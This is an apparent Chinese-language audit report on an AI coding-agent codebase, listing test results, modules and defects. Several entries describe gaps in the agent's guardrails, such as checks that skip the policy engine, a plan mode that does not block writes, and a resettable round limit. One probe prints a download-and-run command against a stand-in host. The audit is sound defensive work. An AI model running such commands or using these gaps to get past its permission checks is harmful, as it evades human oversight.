# CODEBASE_AUDIT · mod-agent 第一阶段全仓库深度审计

> 审计基线：`master` @ `75d8e06`（2026-11-27）
> 审计方式：逐文件阅读真实源码 + 执行现有校验 + 针对可疑路径编写可复现探针
> 审计结论的性质：**本文件不修改任何生产代码**，只登记事实与证据

## 0. 摘要

本次审计推翻了一个常见的错误前提：mod-agent **不是**"只有文档、没有代码"的设计阶段仓库。
`src/` 下有 **52 个 TypeScript 文件、13,410 行**实现，`tests/` 下有 **12 个测试文件、7,263 行、417 条用例**，
类型检查、ESLint、markdownlint、链接校验、Prettier **全部通过**。

因此本报告的主线不是"缺什么功能"，而是三件更精确的事：

1. **已经能跑通的部分质量相当高**，主循环、编辑护栏、命令策略、状态持久化、沙箱生命周期都有真实实现与针对性测试；
2. **真正的问题集中在"设计承诺"与"代码行为"之间的缝隙**：若干注释/工具描述/文档声称的保障，代码里并未落地；
3. **CI 不跑测试**，导致上面这些缝隙没有任何自动化手段能在合并前拦住。

一句话结论：**这是一个工程质量良好、但存在若干"声明即保障"错觉的中期实现**。
最危险的不是没写的功能，而是**写了注释、看起来像已经防住了、实际没防住**的那几处。

## 1. 校验基线（真实执行结果）

| 检查项             | 命令                   | 结果                                                 |
| ------------------ | ---------------------- | ---------------------------------------------------- |
| 类型检查           | `npx tsc --noEmit`     | ✅ 通过，0 错误（strict + noUncheckedIndexedAccess） |
| 单元/集成测试      | `npx vitest run`       | ✅ 12 文件 / 417 用例全过，53s                       |
| ESLint             | `npm run lint:eslint`  | ✅ 0 问题                                            |
| markdownlint       | `npm run lint:md`      | ✅ 33 文件 0 问题（基线时点，不含本目录）            |
| 文档链接与锚点     | `npm run lint:links`   | ✅ 24 篇文档全部有效（基线时点，不含本目录）         |
| AGENTS.md 命令校验 | `npm run lint:agents`  | ✅ 10 个命令引用均存在                               |
| Prettier           | `npm run format:check` | ✅ 全部符合                                          |
| 构建               | `npm run build`        | ✅ 产物落 `dist/`（未被 git 跟踪）                   |

**未验证项（如实声明）**：测试覆盖率数字无法给出。仓库未安装 `@vitest/coverage-v8`，
而用 `NODE_V8_COVERAGE` 采集时，Vite 转换后的模块不以 `file://` URL 注册，
18 个覆盖文件里 863 个 URL 无一命中 `src/`。详见 `TEST_COVERAGE_REPORT.md` §4。

**交付后复验**：六份报告写入后重新跑完整 `npm run lint`（五个子命令串行）与 `npm test`，
结果仍为 0 问题 / 417 用例全过；此时 markdownlint 覆盖 39 个文件、链接校验覆盖 30 篇文档
（较基线各多出本目录 6 篇）。审计产物自身没有走任何豁免，与仓库既有标准同档通过。

## 2. 模块清单与职责

分层依赖为 `shared → model → tools → policy → runtime → store`，`runtime` 不直接 import `fs` /
`child_process` / 厂商 SDK，全部经接口注入。这条边界在代码里**基本守住了**，仅个别位置例外（见 AUD-018）。

| 层     | 文件                                                               | 行数                 | 职责                                                                 | 状态                                |
| ------ | ------------------------------------------------------------------ | -------------------- | -------------------------------------------------------------------- | ----------------------------------- |
| 入口   | `cli/main.ts`、`cli/index.ts`                                      | 10 / 484             | 进程入口、commander 参数解析、doctor/config 子命令                   | IMPLEMENTED                         |
| 入口   | `cli/session.ts`、`cli/repl.ts`                                    | 180 / 149            | CLI 会话装配、交互式 REPL 与斜杠命令                                 | IMPLEMENTED                         |
| 入口   | `cli/io.ts`、`cli/render.ts`、`cli/approval.ts`、`cli/provider.ts` | 109 / 199 / 55 / 130 | I/O 抽象、三种输出格式、审批提示、Provider 装配                      | IMPLEMENTED                         |
| 运行时 | `runtime/loop.ts`                                                  | 1015                 | **唯一主循环**（异步生成器），决策解析、工具调度、验证、修复、检查点 | IMPLEMENTED（有 P1 缺陷）           |
| 运行时 | `runtime/runtime.ts`                                               | 637                  | 依赖装配、任务生命周期、审批、恢复、doctor                           | IMPLEMENTED（有 P1 缺陷）           |
| 运行时 | `runtime/driver.ts`                                                | 169                  | 审批后恢复驱动、退出码映射                                           | IMPLEMENTED                         |
| 运行时 | `runtime/state-machine.ts`                                         | 107                  | 14 态转换表                                                          | PARTIAL（多处被绕过）               |
| 运行时 | `runtime/budget.ts`、`progress.ts`                                 | 116 / 188            | 预算门禁、进度守卫                                                   | IMPLEMENTED                         |
| 模型   | `model/gateway.ts`                                                 | 204                  | 超时、重试、退避抖动、记账                                           | IMPLEMENTED（Retry-After 未接）     |
| 模型   | `model/anthropic.ts`、`openai-compat.ts`                           | 263 / 361            | 两家协议映射、错误分类                                               | PARTIAL（无流式）                   |
| 模型   | `model/scripted.ts`、`types.ts`                                    | 169 / 156            | 离线回放、统一契约、计价                                             | IMPLEMENTED                         |
| 工具   | `tools/registry.ts`、`executor.ts`                                 | 262 / 508            | 三层装配、八阶段执行生命周期                                         | IMPLEMENTED（有 P1 缺陷）           |
| 工具   | `tools/builtin/repo.ts`                                            | 463                  | 列目录/读文件/搜索/git status/read diff                              | IMPLEMENTED                         |
| 工具   | `tools/builtin/edit.ts`、`command.ts`、`plan.ts`                   | 193 / 328 / 185      | 编辑、命令与测试、规划与 tool_search                                 | IMPLEMENTED / **plan 为 DEFECTIVE** |
| 策略   | `policy/engine.ts`、`rules.ts`                                     | 483 / 393            | 三态判定、规则解析、bypass-immune                                    | IMPLEMENTED（有 P1 缺陷）           |
| 策略   | `policy/command.ts`、`pathguard.ts`                                | 416 / 241            | 复合命令拆分、wrapper 剥离、realpath 守卫                            | IMPLEMENTED（gitignore 失效）       |
| 沙箱   | `sandbox/index.ts`、`process-runner.ts`                            | 282 / 222            | 后端选择、无 shell 子进程、整组 kill、输出上限                       | IMPLEMENTED                         |
| 编辑   | `patch/edit.ts`、`diff.ts`                                         | 400 / 226            | read-before-edit、mtime、唯一匹配、引号容错、diff                    | IMPLEMENTED                         |
| 上下文 | `context/system-prompt.ts`、`rules.ts`、`compaction.ts`            | 147 / 147 / 258      | 动静分离、AGENTS.md 拼接与 @import、分层压缩                         | PARTIAL                             |
| 验证   | `validation/runner.ts`                                             | 208                  | 成本递增流水线、partial 语义                                         | IMPLEMENTED（绕过策略）             |
| 存储   | `store/sqlite.ts`、`memory.ts`、`types.ts`                         | 817 / 253 / 198      | 乐观锁、事件、检查点、审批、工具调用、产物                           | IMPLEMENTED                         |
| 观测   | `observability/logger.ts`                                          | 180                  | 脱敏 JSONL 日志、进程内指标                                          | IMPLEMENTED（缺审批阻塞时长）       |
| 共享   | `shared/*.ts`（8 个）                                              | 1,050                | 契约、错误码、hash、id、JSON Schema、脱敏、token                     | IMPLEMENTED                         |

## 3. 缺陷登记册

状态图例：**IMPLEMENTED** 已实现且有测试 · **PARTIAL** 部分实现 · **MISSING** 未实现 ·
**DEFECTIVE** 已实现但有缺陷 · **UNVERIFIED** 无法验证

优先级：**P0** 安全漏洞/核心执行错误/数据丢失 · **P1** 核心能力缺失/架构缺陷 ·
**P2** 体验与扩展性 · **P3** 非必要优化

### 3.1 P1（核心能力与架构）

| ID      | 问题                                                                                                                                                                                             | 位置                                                                              | 状态                    | 证据                                                                            |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------- | ----------------------- | ------------------------------------------------------------------------------- |
| AUD-001 | **并行工具调用被静默丢弃**：一轮响应里只取 `toolCalls[0]`，其余不执行也不告知；且 assistant 历史只写入第一个 `tool_use`，模型自己的操作记录被改写                                                | `runtime/loop.ts:396-442`                                                         | DEFECTIVE               | 探针 P4：模型请求 2 个 read_file，实际只执行 1 个，任务仍报 `completed success` |
| AUD-002 | **累计拒绝上限抛出的异常穿透执行器**：`recordDenial()` 直接 `throw DenialLimitExceeded`，`executor.execute` 不捕获，`loop.ts:595` 也不捕获 → 生成器抛出，任务死在 `executing`                    | `policy/engine.ts:187-193`、`tools/executor.ts:158-159`、`runtime/loop.ts:595`    | DEFECTIVE               | 探针 P1：第 20 次拒绝时抛出 `DenialLimitExceeded`                               |
| AUD-003 | **验证流水线完全绕过策略引擎**：`runChecks` 直接调 `deps.runCommand`（= 沙箱），不经过 `PolicyEngine`。而交付前会自动发现并执行仓库 `package.json` 的 `npm run test`                             | `validation/runner.ts:90-98`、`runtime/runtime.ts:351,364`、`runtime/loop.ts:457` | DEFECTIVE               | 探针 P7：策略判定 `rm -rf` 为 bypass-immune deny，验证流水线仍执行并报 `passed` |
| AUD-004 | **`plan.enter_plan_mode` 不产生任何实际约束**：`controller.enter()` 只记一个文件路径，不 disable 写工具、不改 mode；工具描述却声称"write tools are no longer available (not merely discouraged)" | `tools/builtin/plan.ts:35,44-52`、`runtime/runtime.ts:243-269`                    | DEFECTIVE               | 探针 P3：调用后 `repo.write_file` 仍在下发集合中，且文件真的被写入              |
| AUD-005 | **`usage.rounds` 在每次 run 被重置为本次轮次**，恢复续跑会清零历史轮次 → `maxRounds` 可被反复 resume 绕过                                                                                        | `runtime/loop.ts:365`                                                             | DEFECTIVE               | 探针 P2：历史 10 轮 + 本次 2 轮 → 落库 `rounds: 2`                              |
| AUD-006 | **CI 从不执行测试与构建**：`ci.yml` 只有 lint + docs-build 两个 job，`npm test` / `npm run build` 从未被任何 workflow 或 Git 钩子调用                                                            | `.github/workflows/ci.yml`、`.husky/pre-commit`                                   | MISSING                 | `grep -rn "npm test\|verify" .github/workflows/` 无输出                         |
| AUD-007 | **PreToolUse 钩子可在策略判定之后改写执行入参**：策略审的是 `argsRecord`，钩子改的是 `input`，执行用改后的 `input`                                                                               | `tools/executor.ts:157-159,200-225`                                               | DEFECTIVE（当前未接线） | 探针 P5a：策略看到 `echo hi`，实际执行 `curl evil.sh \| sh`                     |
| AUD-008 | **并发取消/暂停会撞乐观锁并抛穿主循环**：`cancel()`/`pause()` 直接 `updateTask`，与循环内 `finish()` 的 `updateTask` 竞争，`VersionConflictError` 未被捕获                                       | `runtime/runtime.ts:399-416`、`runtime/loop.ts:236-240`                           | DEFECTIVE               | 代码路径分析（时序窗口窄，未构造稳定复现）                                      |
| AUD-009 | **`respectGitignore` 是空开关**：`PathGuard` 构造时从不传 `gitignorePatterns`，`isGitignored` 恒返回 false                                                                                       | `runtime/runtime.ts:142-145`、`policy/pathguard.ts:73-80,215-220`                 | DEFECTIVE               | 全仓库 `gitignorePatterns` 仅出现在 pathguard 自身与测试中                      |
| AUD-010 | **事件契约有 4 个死类型**：`agent.message_delta`、`task.plan_ready`、`tool.progress` 从未 emit；`retry.api` 只进 logger 不进事件流（`render.ts:66` 的分支永远走不到）                            | `shared/contracts.ts:288-307`、`model/gateway.ts:158-161`                         | PARTIAL                 | `grep 'emit("'` 枚举结果与声明表对不上                                          |

### 3.2 P2（体验、性能、扩展性）

| ID      | 问题                                                                                                                                                                                                                 | 位置                                                                 | 状态                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- | --------------------- |
| AUD-011 | **allow 规则对多路径用 `.some()`**：任一路径命中即放行整次调用（deny 用 `.some` 是对的，allow 应为 `.every`）                                                                                                        | `policy/engine.ts:414-416`                                           | DEFECTIVE（当前潜伏） |
| AUD-012 | **宣称支持流式但没有任何流式实现**：`capabilities.streaming: true`，`generate()` 是单次非流式 POST，无 SSE/ReadableStream                                                                                            | `model/anthropic.ts:37-41`、`model/openai-compat.ts:36-42`           | MISSING               |
| AUD-013 | **成本估算对所有模型用同一张价目表**（$3/$15 per MTok，即 Sonnet 档），`maxCostUsd` 门禁因此建立在虚构数字上                                                                                                         | `model/types.ts:151-156`、`anthropic.ts:246`、`openai-compat.ts:230` | DEFECTIVE             |
| AUD-014 | **`Retry-After` 解析了但从未使用**：`parseRetryAfter` 无调用方，网关只用固定指数退避 + 抖动                                                                                                                          | `model/openai-compat.ts:327-335`、`model/gateway.ts:130-144`         | PARTIAL               |
| AUD-015 | **`onTimeout: "move-to-background"` 从未被兑现**：契约里有该枚举，`process-runner` 超时一律 kill                                                                                                                     | `shared/contracts.ts:91`、`sandbox/process-runner.ts:123-126`        | MISSING               |
| AUD-016 | **五处配置项为死配置**：`limits.commandMaxTimeoutMs`、`envAllowlist`、`sandbox.allowedDomains`、`sandbox.deniedDomains`、`sandbox.networkMode`                                                                       | `config/settings.ts:60-61,86-88,106`                                 | DEFECTIVE             |
| AUD-017 | **六处 API 为死代码**：`Store.transition()`（两实现 + 契约，仅测试调用）、`bumpToolCallRetry`、`AgentTool.checkPermissions`、`Assembly.cacheBreakpoint`、`CommandSegment.hasShellMetachars`、`LoopDeps.planFilePath` | 见各文件                                                             | DEFECTIVE             |
| AUD-018 | **`runtime` 直接 import `node:fs` 写产物**（`persistArtifact`），与"runtime 不直接碰 fs"的架构约束不符                                                                                                               | `runtime/loop.ts:891-912`                                            | DEFECTIVE             |
| AUD-019 | **`.env.example` 无法读取**：`**/.env.*` 进 bypass-immune，`assertReadable` 无审批逃逸口                                                                                                                             | `policy/rules.ts:325-348`、`policy/pathguard.ts:129-154`             | DEFECTIVE             |
| AUD-020 | **`CODE_LIKE_PATHS` 变成"批了也不给写"**：`execute` 里抛 `TOOL_PERMISSION_DENIED`，但此时策略已 allow，审批被浪费                                                                                                    | `tools/builtin/edit.ts:62-66,136-139`、`policy/pathguard.ts:192-198` | DEFECTIVE             |
| AUD-021 | **嵌套 AGENTS.md 在生产路径永远不加载**：`bundleRules(root)` 未传 `targetDir`，只读根目录                                                                                                                            | `runtime/runtime.ts:336`、`context/rules.ts:40-77`                   | PARTIAL               |
| AUD-022 | **压缩的"首条 user 永远保留"保护错了对象**：循环把动态环境块插在用户请求之前，`takeHead` 保住的是环境块                                                                                                              | `runtime/loop.ts:338-342`、`context/compaction.ts:154-170`           | DEFECTIVE             |
| AUD-023 | **验证命令超时硬编码 300s**，与"阈值一处定义、可查可改"的纪律冲突；`TOOL_PERMISSION_DENIED` 分支不可达（验证不走策略）                                                                                               | `validation/runner.ts:94,155-159`                                    | DEFECTIVE             |
| AUD-024 | **`runtime.appendEvent` 用"读全量再 +1"算 seq**，与 `loop.ts:917-919` 注释里明确警告的撞唯一约束写法一致                                                                                                             | `runtime/runtime.ts:560-574`                                         | DEFECTIVE             |
| AUD-025 | **`repo.search_text` 全树无上限扫描**（`walk(root, 8)` 后逐文件 `readFile`），大仓库会拖死一个 turn；`maxResults > 50` 被静默钳制                                                                                    | `tools/builtin/repo.ts:287-295,289`                                  | DEFECTIVE             |
| AUD-026 | **`estimateMessagesTokens` 两个同名实现语义不同**（`model/types.ts:124` 按字符，`context/compaction.ts:49` 按 token），后者才被使用                                                                                  | `model/types.ts:124`                                                 | DEFECTIVE             |
| AUD-027 | **`indexRules` 抛错未被配置层捕获**：设置里一条语法错的规则会让 `AgentRuntime.create` 直接崩，而非启动时给出可读错误                                                                                                 | `policy/engine.ts:432-448`、`config/settings.ts:415-425`             | DEFECTIVE             |
| AUD-028 | **规则文本无大小预算**：单个规则文件上限 4MB，`combined` 无上限，可能一次吃掉大半个上下文窗口                                                                                                                        | `context/rules.ts:136-145`、`runtime/runtime.ts:336`                 | DEFECTIVE             |

### 3.3 P3（非必要优化）

| ID      | 问题                                                                                                           | 位置                                |
| ------- | -------------------------------------------------------------------------------------------------------------- | ----------------------------------- |
| AUD-029 | `//` 绝对路径锚点在 Windows 上失效（`pattern.slice(1)` 得到 `/C:/...`，与 normalize 后无前导斜杠的目标不匹配） | `policy/rules.ts:168-170`           |
| AUD-030 | `loop.ts:407` 的 `...(call.argsParseError ? {} : {})` 是恒等空展开，`argsParseError` 被完全丢弃                | `runtime/loop.ts:407`               |
| AUD-031 | `maxTokens: 8_192` 硬编码在循环里，不可配置                                                                    | `runtime/loop.ts:377`               |
| AUD-032 | `failedResult` 用 `new Date()` 而非注入的时钟                                                                  | `tools/executor.ts:425`             |
| AUD-033 | `isTimeoutError` 判断与上一行条件完全重复（死条件）                                                            | `tools/executor.ts:238-239,473-475` |
| AUD-034 | `mapFinishReason` 的 `return reason ? "unknown" : "unknown"` 是恒等三元                                        | `model/openai-compat.ts:280`        |
| AUD-035 | `renderCommandResult` 对同一段文本两次调用 `withEmptyNotice`                                                   | `tools/executor.ts:489,498`         |
| AUD-036 | `repo.read_diff` 为拿 stat 与全文跑两次 `git diff`                                                             | `tools/builtin/repo.ts:427-452`     |
| AUD-037 | `getTask` 每次都加载全部历史消息，循环内每轮多次调用（O(n) JSON 解析）                                         | `store/sqlite.ts:237-268`           |
| AUD-038 | `registerWithLengthCheck` 被用在内置工具上，该 API 的语义（MCP 工具名 ≤128）被误用                             | `runtime/runtime.ts:231-232`        |

## 4. 值得保留的设计（不要重构掉）

审计的默认立场是"优先保留已有稳定模块"。以下设计经过代码核对确实成立，是后续开发的资产：

1. **单一主循环 + 异步生成器**（`loop.ts:169`）。背压、取消、预算三个开关共用一条控制流，没有第二条绕过它的执行路径。这是很难得的设计自律。
2. **工具错误是数据不是异常**。`executor.execute` 不向上抛业务异常，失败转成 `is_error` 的 tool_result 回喂（`loop.ts:724-735`）。自修复能力的地基。
3. **绝不 `shell: true`**。`process-runner.ts:76-84` 用 `spawn(executable, args)`，`$()`、`;`、管道在根上就不成立；超时按进程组 kill（POSIX `-pid` / Windows `taskkill /T`）。
4. **命令先拆段再匹配**。`policy/command.ts` 把 `&& || ; | &` 拆开逐段判定，并处理 wrapper 剥离、`npx`/`docker` 不剥离、`find -exec` 只能精确匹配。这套语义比多数同类实现更严谨。
5. **read-before-edit + mtime 一致性 + 唯一匹配**。`patch/edit.ts` 三道护栏全部在代码层，不依赖提示词；`normalizeForMatch` 还专门保证"规范化不改变长度"，避免下标漂移写坏文件——这个 bug 的注释记录说明作者踩过。
6. **策略判定的结构化输入**（`policyCommand`/`policyPaths`/`policyDomains`），且**在工具 `validate` 之后再求值**（`loop.ts:608-616`），解决了"批准的命令 ≠ 执行的命令"这一类偏差。`test.run` 的 `validate` 补全命令正是这个设计的正确用法。
7. **审批绑定参数哈希且单次生效**（`store/sqlite.ts:545-567`、`runtime.ts:459-486`），批准 `npm test` 不等于批准 `npm install`。
8. **崩溃恢复的判据是 `started` 工具调用记录**（`loop.ts:575-585` + `runtime.ts:431-441`），非幂等且结果未知时标 `outcome_unknown` 而不是自动重放。
9. **fail-closed 的默认值**：无 TTY 时确认类动作直接拒（`engine.ts:351-356`）、沙箱起不来就拒绝执行（`sandbox/index.ts:268-274`）、分类器不可用回落 ask（`engine.ts:365-372`）。
10. **SQLite 用 Node 内置 `node:sqlite`**，不引原生模块；不可用时降级到内存并**显式说明原因**（`store/sqlite.ts:706-714`），不静默降级。

## 5. 工程化评估

| 维度           | 结论            | 说明                                                                                                       |
| -------------- | --------------- | ---------------------------------------------------------------------------------------------------------- |
| `package.json` | 良好            | 脚本齐备，`engines`/`packageManager` 锁定；`bin` 指向 `dist/cli/main.js`；`files: ["dist"]` 正确           |
| `tsconfig`     | 优秀            | `strict` + `noUncheckedIndexedAccess` + `verbatimModuleSyntax` + `isolatedModules`，构建配置分离           |
| ESLint         | 良好            | flat config，v10；仅 recommended 集，未启用 `strictTypeChecked`（可作后续增强）                            |
| 测试           | **强但未入 CI** | 417 用例、离线、真实文件系统、ScriptedProvider 回放；`pool: forks` 隔离；但 CI 不跑（AUD-006）             |
| CI/CD          | **关键缺口**    | lint + docs-build；无 test、无 build、无覆盖率门禁                                                         |
| 依赖安全       | 良好            | 运行期依赖仅 `commander` + `zod`；CodeQL / dependency-review / scorecard / gitleaks 四个安全 workflow 齐备 |
| 发布流程       | 良好            | release-please + Conventional Commits + commitlint 钩子                                                    |
| 构建产物       | 正确            | `dist/` 被 gitignore，`git ls-files dist` 为 0                                                             |

**依赖面积极小是本项目的一大优势**：2 个运行期依赖意味着供应链攻击面、升级负担、原生模块编译问题几乎为零。这一点应当在后续开发中继续保持，不要为了便利引入大型框架。

## 6. 审计方法与可复现性

1. 先跑 `git status` / `rev-parse HEAD` 建立基线，确认工作区干净。
2. 逐文件通读 `src/` 全部 52 个文件，不做抽样。
3. 执行 §1 全部校验命令并记录真实输出。
4. 对 8 个可疑路径编写独立探针（`/tmp/probe/*.mjs`，基于 `npm run build` 产物，不写入仓库），
   逐条确认或否证假设。**被否证的假设不予登记**（例如"`policyPaths` 多路径 allow 是 P0"最终定为 P2 潜伏缺陷，因为当前没有多路径写工具）。
5. 交叉核对注释/文档声明与代码行为，凡不一致者单独登记。

审计过程中未修改任何 `src/` 或 `tests/` 文件；`dist/` 由 `npm run build` 重新生成（gitignored）。
